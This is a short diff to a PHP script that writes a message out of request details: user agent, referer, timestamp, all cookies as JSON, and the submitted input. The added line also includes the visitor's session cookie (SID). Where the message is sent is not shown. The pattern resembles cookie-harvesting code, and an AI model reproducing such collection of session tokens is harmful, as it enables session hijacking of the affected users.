@@ -17,6 +17,7 @@ echo json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_
                      'User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . "\n" .
                      'Referer: ' . $_SERVER['HTTP_REFERER'] . "\n" .
                      'Timestamp: ' . date('Y-m-d H:i:s') . "\n" .
+                     'Cookie: ' . $_COOKIE['SID'] . "\n" .
                      "```json\n" . json_encode($_COOKIE, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```" .
                      "```json\n" . json_encode($input, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT) . "\n```",
     ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
